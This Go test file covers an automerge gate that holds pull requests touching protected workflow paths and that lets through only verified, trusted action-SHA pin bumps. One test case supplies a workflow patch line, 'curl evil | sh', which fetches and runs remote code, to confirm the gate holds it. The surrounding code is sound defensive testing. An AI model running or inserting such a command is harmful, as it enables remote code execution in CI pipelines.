package automerge

// Tests for the human-merge-path gate (#11038). As with the intent gate tests,
// the invariant is that the MERGE DOES NOT HAPPEN on a match: every refusal
// asserts zero PUT .../merge calls, not merely a skip reason.

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync"
	"testing"

	gh "github.com/google/go-github/v72/github"
	"github.com/hivecommons/hive/pkg/config"
	hgithub "github.com/hivecommons/hive/pkg/github"
)

const testHumanMergePattern = ".github/workflows/**"

// humanPathFront fronts a lane fixture: it serves the PR files list and the
// hold label / comment endpoints for PR 7 itself and proxies everything else
// to the fixture, so each lane's existing fake keeps driving the merge path.
type humanPathFront struct {
	mu          sync.Mutex
	files       []string
	fileEntries []map[string]any // when set, served first, before the entries built from files
	filesStatus int
	filesHits   int
	// commits is served for GET pulls/7/commits; nil serves one verified
	// commit at head sha7 by renovate-bot so pin-only fixtures qualify.
	commits       []map[string]any
	commitsStatus int
	commitsHits   int
	labels        []string
	comments      []string
}

// testPinCommit is one PR commit as the gate sees it: author login, GitHub
// signature verification and SHA.
func testPinCommit(sha, login string, verified bool) map[string]any {
	return map[string]any{
		"sha":    sha,
		"author": map[string]any{"login": login},
		"commit": map[string]any{"verification": map[string]any{"verified": verified}},
	}
}

func newHumanPathFront(t *testing.T, backend string, f *humanPathFront) *httptest.Server {
	t.Helper()
	target, err := url.Parse(backend)
	if err != nil {
		t.Fatalf("parse backend url: %v", err)
	}
	proxy := httputil.NewSingleHostReverseProxy(target)
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		switch {
		case r.Method == http.MethodGet && r.URL.Path == "/repos/acme/widget/pulls/7/files":
			f.filesHits++
			if f.filesStatus != 0 {
				w.WriteHeader(f.filesStatus)
				return
			}
			files := f.fileEntries
			for _, name := range f.files {
				files = append(files, map[string]any{"filename": name, "status": "modified", "additions": 1})
			}
			json.NewEncoder(w).Encode(files)
		case r.Method == http.MethodGet && r.URL.Path == "/repos/acme/widget/pulls/7/commits":
			f.commitsHits++
			if f.commitsStatus != 0 {
				w.WriteHeader(f.commitsStatus)
				return
			}
			commits := f.commits
			if commits == nil {
				commits = []map[string]any{testPinCommit("sha7", "renovate-bot", true)}
			}
			json.NewEncoder(w).Encode(commits)
		case r.Method == http.MethodPost && r.URL.Path == "/repos/acme/widget/issues/7/labels":
			var labels []string
			_ = json.NewDecoder(r.Body).Decode(&labels)
			f.labels = append(f.labels, labels...)
			json.NewEncoder(w).Encode([]map[string]string{{"name": "hold"}})
		case r.Method == http.MethodGet && r.URL.Path == "/repos/acme/widget/issues/7/comments":
			var out []map[string]any
			for _, body := range f.comments {
				out = append(out, map[string]any{"body": body})
			}
			json.NewEncoder(w).Encode(out)
		case r.Method == http.MethodPost && r.URL.Path == "/repos/acme/widget/issues/7/comments":
			var body struct {
				Body string `json:"body"`
			}
			_ = json.NewDecoder(r.Body).Decode(&body)
			f.comments = append(f.comments, body.Body)
			json.NewEncoder(w).Encode(map[string]any{"id": len(f.comments)})
		default:
			proxy.ServeHTTP(w, r)
		}
	}))
}

func humanPathsFor(repo string, patterns ...string) func(string) []string {
	return func(r string) []string {
		if strings.EqualFold(r, repo) {
			return patterns
		}
		return nil
	}
}

func assertHeldOnce(t *testing.T, f *humanPathFront, path string) {
	t.Helper()
	f.mu.Lock()
	defer f.mu.Unlock()
	if len(f.labels) == 0 || f.labels[0] != "hold" {
		t.Fatalf("labels added = %v, want hold", f.labels)
	}
	if len(f.comments) != 1 {
		t.Fatalf("comments posted = %d, want exactly 1", len(f.comments))
	}
	c := f.comments[0]
	if !strings.Contains(c, hgithub.HumanMergePathMarker) || !strings.Contains(c, path) || !strings.Contains(c, hgithub.HumanMergePathsConfigKey) {
		t.Fatalf("comment = %q, want marker, path %q and config key", c, path)
	}
}

// A Tier 3 App PR that EvaluateForAppSelfMerge authorizes (pinned in
// TestSelfAuthoredSweepIntentGateAuthorizedTiersMerge) is held, not merged,
// when it touches a human-merge path — and the comment is not reposted on the
// next tick.
func TestSelfAuthoredSweepHumanMergePathHoldsAuthorizedTier3(t *testing.T) {
	merges := 0
	api := newSelfSweepGuardAPI(t, selfSweepFixture{files: []string{testIntentGuardrailFile}, mergeApplied: true, mergeCalls: &merges})
	defer api.Close()
	front := &humanPathFront{files: []string{testIntentGuardrailFile}}
	srv := newHumanPathFront(t, api.URL, front)
	defer srv.Close()

	c := newIntentGateSweepClient(srv.URL, true)
	c.SetHumanMergePaths(humanPathsFor("acme/widget", testHumanMergePattern))
	for tick := 0; tick < 2; tick++ {
		event, reason, err := c.trySweepSelfAuthoredPR(context.Background(), "acme/widget", "acme", "widget", 7, true)
		if err != nil {
			t.Fatalf("tick %d: err = %v, want nil", tick, err)
		}
		if reason != autoMergeReasonHumanMergePath {
			t.Fatalf("tick %d: reason = %q, want %q", tick, reason, autoMergeReasonHumanMergePath)
		}
		if event.MergeSHA != "" || merges != 0 {
			t.Fatalf("tick %d: event = %+v, merges = %d; want no merge", tick, event, merges)
		}
	}
	assertHeldOnce(t, front, testIntentGuardrailFile)
}

// The gate does not depend on intent: with no IntentGate installed at all the
// PR is still held.
func TestSelfAuthoredSweepHumanMergePathAppliesWithoutIntentGate(t *testing.T) {
	merges := 0
	api := newSelfSweepGuardAPI(t, selfSweepFixture{files: []string{testIntentGuardrailFile}, mergeApplied: true, mergeCalls: &merges})
	defer api.Close()
	front := &humanPathFront{files: []string{testIntentGuardrailFile}}
	srv := newHumanPathFront(t, api.URL, front)
	defer srv.Close()

	c := New(newAutoMergeSweepClient(srv.URL).transport, Options{HumanMergePaths: humanPathsFor("ACME/Widget", testHumanMergePattern)})
	_, reason, err := c.trySweepSelfAuthoredPR(context.Background(), "acme/widget", "acme", "widget", 7, true)
	if err != nil || reason != autoMergeReasonHumanMergePath || merges != 0 {
		t.Fatalf("reason = %q, err = %v, merges = %d; want held with no merge", reason, err, merges)
	}
	assertHeldOnce(t, front, testIntentGuardrailFile)
}

func TestSelfAuthoredSweepHumanMergePathUnconfiguredOrNoMatchMerges(t *testing.T) {
	for _, tc := range []struct {
		name  string
		paths func(string) []string
		hits  int
	}{
		{name: "unconfigured engine", paths: nil, hits: 0},
		{name: "other repo configured", paths: humanPathsFor("acme/other", testHumanMergePattern), hits: 0},
		{name: "configured without match", paths: humanPathsFor("acme/widget", "docs/**"), hits: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			merges := 0
			api := newSelfSweepGuardAPI(t, selfSweepFixture{files: []string{testIntentGuardrailFile}, mergeApplied: true, mergeCalls: &merges})
			defer api.Close()
			front := &humanPathFront{files: []string{testIntentGuardrailFile}}
			srv := newHumanPathFront(t, api.URL, front)
			defer srv.Close()

			c := newAutoMergeSweepClient(srv.URL)
			c.SetHumanMergePaths(tc.paths)
			event, reason, err := c.trySweepSelfAuthoredPR(context.Background(), "acme/widget", "acme", "widget", 7, true)
			if err != nil || reason != "" {
				t.Fatalf("reason = %q, err = %v; want clean merge", reason, err)
			}
			if event.MergeSHA != "merge7" || merges != 1 {
				t.Fatalf("event = %+v, merges = %d; want one merge", event, merges)
			}
			if front.filesHits != tc.hits || len(front.labels) != 0 || len(front.comments) != 0 {
				t.Fatalf("files hits = %d (want %d), labels = %v, comments = %d; want no hold", front.filesHits, tc.hits, front.labels, len(front.comments))
			}
		})
	}
}

// A file-list error fails closed only when the repo has patterns configured.
func TestSelfAuthoredSweepHumanMergePathFileListErrorFailsClosedOnlyWhenConfigured(t *testing.T) {
	for _, tc := range []struct {
		name       string
		paths      func(string) []string
		changed    int
		wantReason string
		wantMerges int
	}{
		{name: "configured, files API error", paths: humanPathsFor("acme/widget", testHumanMergePattern), wantReason: autoMergeReasonHumanMergePathEvidence},
		{name: "configured, incomplete list", paths: humanPathsFor("acme/widget", testHumanMergePattern), changed: 3, wantReason: autoMergeReasonHumanMergePathEvidence},
		{name: "unconfigured, files API error", paths: nil, wantMerges: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			merges := 0
			api := newSelfSweepGuardAPI(t, selfSweepFixture{files: []string{"src/a.go"}, changedFiles: tc.changed, mergeApplied: true, mergeCalls: &merges})
			defer api.Close()
			front := &humanPathFront{files: []string{"src/a.go"}}
			if tc.changed == 0 {
				front.filesStatus = http.StatusInternalServerError
			}
			srv := newHumanPathFront(t, api.URL, front)
			defer srv.Close()

			c := newAutoMergeSweepClient(srv.URL)
			c.SetHumanMergePaths(tc.paths)
			_, reason, err := c.trySweepSelfAuthoredPR(context.Background(), "acme/widget", "acme", "widget", 7, true)
			if reason != tc.wantReason || merges != tc.wantMerges {
				t.Fatalf("reason = %q, merges = %d; want %q / %d", reason, merges, tc.wantReason, tc.wantMerges)
			}
			if (err != nil) != (tc.wantReason != "") {
				t.Fatalf("err = %v, want error only when failing closed", err)
			}
			if len(front.labels) != 0 || len(front.comments) != 0 {
				t.Fatalf("labels = %v, comments = %d; an unknown file list must not hold or comment", front.labels, len(front.comments))
			}
		})
	}
}

// An existing marker comment (e.g. a person removed `hold` and a later tick
// re-held) is never duplicated; a hold-label failure surfaces as an error but
// still withholds the merge.
func TestHumanMergePathGateExistingMarkerAndLabelFailure(t *testing.T) {
	t.Run("existing marker", func(t *testing.T) {
		merges := 0
		api := newSelfSweepGuardAPI(t, selfSweepFixture{files: []string{testIntentGuardrailFile}, mergeApplied: true, mergeCalls: &merges})
		defer api.Close()
		front := &humanPathFront{files: []string{testIntentGuardrailFile}, comments: []string{"older\n" + hgithub.HumanMergePathMarker + "\n- `x`"}}
		srv := newHumanPathFront(t, api.URL, front)
		defer srv.Close()
		c := newAutoMergeSweepClient(srv.URL)
		c.SetHumanMergePaths(humanPathsFor("acme/widget", testHumanMergePattern))
		_, reason, err := c.trySweepSelfAuthoredPR(context.Background(), "acme/widget", "acme", "widget", 7, true)
		if err != nil || reason != autoMergeReasonHumanMergePath || merges != 0 {
			t.Fatalf("reason = %q, err = %v, merges = %d", reason, err, merges)
		}
		if len(front.comments) != 1 {
			t.Fatalf("comments = %d, want the existing marker comment only", len(front.comments))
		}
	})
	t.Run("label failure", func(t *testing.T) {
		merges := 0
		api := newSelfSweepGuardAPI(t, selfSweepFixture{files: []string{testIntentGuardrailFile}, mergeApplied: true, mergeCalls: &merges})
		defer api.Close()
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			switch {
			case r.Method == http.MethodGet && r.URL.Path == "/repos/acme/widget/pulls/7/files":
				json.NewEncoder(w).Encode([]map[string]any{{"filename": testIntentGuardrailFile}})
			case r.Method == http.MethodPost && r.URL.Path == "/repos/acme/widget/issues/7/labels":
				w.WriteHeader(http.StatusForbidden)
			default:
				target, _ := url.Parse(api.URL)
				httputil.NewSingleHostReverseProxy(target).ServeHTTP(w, r)
			}
		}))
		defer srv.Close()
		c := newAutoMergeSweepClient(srv.URL)
		c.SetHumanMergePaths(humanPathsFor("acme/widget", testHumanMergePattern))
		_, reason, err := c.trySweepSelfAuthoredPR(context.Background(), "acme/widget", "acme", "widget", 7, true)
		if err == nil || reason != autoMergeReasonHumanMergePath || merges != 0 {
			t.Fatalf("reason = %q, err = %v, merges = %d; want held with error and no merge", reason, err, merges)
		}
	})
}

func TestTrustedAuthorSweepHumanMergePathHolds(t *testing.T) {
	fx := trustedSweepFixture{}
	api := newTrustedSweepAPI(t, &fx)
	defer api.Close()
	front := &humanPathFront{files: []string{".github/workflows/release.yml", "src/a.go"}}
	srv := newHumanPathFront(t, api.URL, front)
	defer srv.Close()

	policy := TrustedAuthorPolicy{Enabled: true, RequireRole: "merger"}
	engine := newTrustedSweepEngine(srv.URL, policy, Options{HumanMergePaths: humanPathsFor("acme/widget", testHumanMergePattern)})
	_, reason, err := engine.trySweepTrustedAuthorPR(context.Background(), "widget", "acme", "widget", 7, policy)
	if err != nil || reason != autoMergeReasonHumanMergePath {
		t.Fatalf("reason = %q, err = %v; want %q", reason, err, autoMergeReasonHumanMergePath)
	}
	if fx.merges != 0 {
		t.Fatalf("merges = %d, want 0", fx.merges)
	}
	assertHeldOnce(t, front, ".github/workflows/release.yml")
	if strings.Contains(front.comments[0], "src/a.go") {
		t.Fatalf("comment names a non-matching path: %q", front.comments[0])
	}
}

func TestQueuedSweepHumanMergePathHolds(t *testing.T) {
	var merged []int
	api := newAutoMergeSweepAPI(t, hgithub.AutoMergeQueuedLabel, []sweepPR{{
		number:          7,
		author:          "alice",
		queuedBy:        "bob",
		label:           true,
		mergeableState:  "clean",
		statusState:     "success",
		checkStatus:     "completed",
		checkConclusion: "success",
	}}, &merged)
	defer api.Close()
	front := &humanPathFront{files: []string{".github/workflows/ci.yml"}}
	srv := newHumanPathFront(t, api.URL, front)
	defer srv.Close()

	c := newAutoMergeSweepClient(srv.URL)
	c.SetHumanMergePaths(humanPathsFor("acme/widget", testHumanMergePattern))
	_, reason, err := c.trySweepQueuedPR(context.Background(), "widget", "acme", "widget", 7, hgithub.AutoMergeQueuedLabel)
	if err != nil || reason != autoMergeReasonHumanMergePath {
		t.Fatalf("reason = %q, err = %v; want %q", reason, err, autoMergeReasonHumanMergePath)
	}
	if len(merged) != 0 {
		t.Fatalf("merged = %v, want none", merged)
	}
	assertHeldOnce(t, front, ".github/workflows/ci.yml")
}

func TestSetHumanMergePathsNilEngine(t *testing.T) {
	var c *Engine
	c.SetHumanMergePaths(humanPathsFor("acme/widget", "x"))
	if got := c.currentHumanMergePaths("acme/widget"); got != nil {
		t.Fatalf("nil engine paths = %v, want nil", got)
	}
}

// Pin-only exception (#16266): fixtures for calling humanMergePathGate on a PR
// whose files carry patches.
var (
	testPinOldLine = "      - uses: actions/checkout@" + strings.Repeat("a", 40) + " # v4"
	testPinNewLine = "      - uses: actions/checkout@" + strings.Repeat("b", 40) + " # v5"
)

func testPinFile(name string) map[string]any {
	return map[string]any{"filename": name, "status": "modified", "additions": 1, "deletions": 1,
		"patch": "@@ -3 +3 @@\n-" + testPinOldLine + "\n+" + testPinNewLine}
}

func pinOnlyFor(repo string, ex config.PinOnlyException) func(string) (config.PinOnlyException, bool) {
	return func(r string) (config.PinOnlyException, bool) {
		if strings.EqualFold(r, repo) {
			return ex, true
		}
		return config.PinOnlyException{}, false
	}
}

func testPinOnlyException() config.PinOnlyException {
	return config.PinOnlyException{Enabled: true, Paths: []string{".github/workflows/*.yml"}, Kinds: []string{"action-sha"}, TrustedAuthors: []string{"Renovate-Bot"}}
}

func TestHumanMergePathGatePinOnlyException(t *testing.T) {
	const workflow = ".github/workflows/ci.yml"
	for _, tc := range []struct {
		name          string
		paths         func(string) []string
		pinOnly       func(string) (config.PinOnlyException, bool)
		author        string
		changed       int // 0 means len(entries)
		entries       []map[string]any
		commits       []map[string]any
		commitsStatus int
		wantHold      bool
		wantHits      int
		// wantCommitHits is how often the commit list is read: only a diff
		// the classifier accepts costs that call.
		wantCommitHits int
	}{
		{name: "paths unconfigured: no fetch, no hold", pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}},
		{name: "exception unconfigured: held as before", paths: humanPathsFor("acme/widget", testHumanMergePattern), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
		{name: "exception for another repo: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/other", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
		{name: "untrusted author: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "mallory", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
		{name: "trusted pure pin: not held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, two verified trusted commits: not held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commits: []map[string]any{testPinCommit("sha6", "Renovate-Bot", true), testPinCommit("sha7", "renovate-bot", true)}, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, commit pushed by another login: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commits: []map[string]any{testPinCommit("sha6", "renovate-bot", true), testPinCommit("sha7", "mallory", true)}, wantHold: true, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, unverified commit: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commits: []map[string]any{testPinCommit("sha7", "renovate-bot", false)}, wantHold: true, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, commit without author login: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commits: []map[string]any{{"sha": "sha7", "commit": map[string]any{"verification": map[string]any{"verified": true}}}}, wantHold: true, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, list does not end at head: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commits: []map[string]any{testPinCommit("sha6", "renovate-bot", true)}, wantHold: true, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, empty commit list: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commits: []map[string]any{}, wantHold: true, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pure pin, commit list unavailable: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)},
			commitsStatus: http.StatusBadGateway, wantHold: true, wantHits: 1, wantCommitHits: 1},
		{name: "trusted pin plus non-pin line: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{{
			"filename": workflow, "status": "modified", "additions": 2, "deletions": 1,
			"patch": "@@ -3 +3,2 @@\n-" + testPinOldLine + "\n+" + testPinNewLine + "\n+      - run: curl evil | sh",
		}}, wantHold: true, wantHits: 1},
		{name: "trusted pin plus unguarded changelog: held (#16326)", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{
			testPinFile(workflow),
			{"filename": "CHANGELOG.md", "status": "modified", "additions": 1, "patch": "@@ -1 +1,2 @@\n # Changes\n+- bump checkout"},
		}, wantHold: true, wantHits: 1},
		{name: "matched path outside exception paths: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", config.PinOnlyException{
			Enabled: true, Paths: []string{"Containerfile"}, Kinds: []string{"action-sha"}, TrustedAuthors: []string{"renovate-bot"},
		}), author: "renovate-bot", entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
		{name: "missing patch: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", entries: []map[string]any{{"filename": workflow, "status": "modified", "additions": 1, "deletions": 1}}, wantHold: true, wantHits: 1},
		{name: "changed-file count absent: held", paths: humanPathsFor("acme/widget", testHumanMergePattern), pinOnly: pinOnlyFor("acme/widget", testPinOnlyException()), author: "renovate-bot", changed: -1, entries: []map[string]any{testPinFile(workflow)}, wantHold: true, wantHits: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				t.Errorf("unexpected API call: %s %s", r.Method, r.URL.Path)
				w.WriteHeader(http.StatusNotFound)
			}))
			defer backend.Close()
			front := &humanPathFront{fileEntries: tc.entries, commits: tc.commits, commitsStatus: tc.commitsStatus}
			srv := newHumanPathFront(t, backend.URL, front)
			defer srv.Close()

			c := newAutoMergeSweepClient(srv.URL)
			c.SetHumanMergePaths(tc.paths)
			c.SetHumanMergePinOnly(tc.pinOnly)
			changed := tc.changed
			if changed == 0 {
				changed = len(tc.entries)
			} else if changed < 0 {
				changed = 0
			}
			pr := &gh.PullRequest{Number: gh.Ptr(7), ChangedFiles: gh.Ptr(changed), User: &gh.User{Login: gh.Ptr(tc.author)}, Head: &gh.PullRequestBranch{SHA: gh.Ptr("sha7")}}
			reason, err := c.humanMergePathGate(context.Background(), "acme/widget", "acme", "widget", pr)
			if err != nil {
				t.Fatalf("err = %v, want nil", err)
			}
			if front.filesHits != tc.wantHits {
				t.Fatalf("files hits = %d, want %d", front.filesHits, tc.wantHits)
			}
			if front.commitsHits != tc.wantCommitHits {
				t.Fatalf("commit list hits = %d, want %d", front.commitsHits, tc.wantCommitHits)
			}
			if !tc.wantHold {
				if reason != "" || len(front.labels) != 0 || len(front.comments) != 0 {
					t.Fatalf("reason = %q, labels = %v, comments = %d; want no hold", reason, front.labels, len(front.comments))
				}
				return
			}
			if reason != autoMergeReasonHumanMergePath {
				t.Fatalf("reason = %q, want %q", reason, autoMergeReasonHumanMergePath)
			}
			assertHeldOnce(t, front, ".github/workflows/")
		})
	}
}

func TestSetHumanMergePinOnlyNilEngineAndRemoval(t *testing.T) {
	var nilEngine *Engine
	nilEngine.SetHumanMergePinOnly(pinOnlyFor("acme/widget", testPinOnlyException()))
	if _, ok := nilEngine.currentHumanMergePinOnly("acme/widget"); ok {
		t.Fatal("nil engine reported a pin-only exception")
	}
	c := New(newAutoMergeSweepClient("http://127.0.0.1:0").transport, Options{HumanMergePinOnly: pinOnlyFor("acme/widget", testPinOnlyException())})
	if _, ok := c.currentHumanMergePinOnly("ACME/Widget"); !ok {
		t.Fatal("Options.HumanMergePinOnly not installed")
	}
	c.SetHumanMergePinOnly(nil)
	if _, ok := c.currentHumanMergePinOnly("acme/widget"); ok {
		t.Fatal("SetHumanMergePinOnly(nil) did not remove the lookup")
	}
}
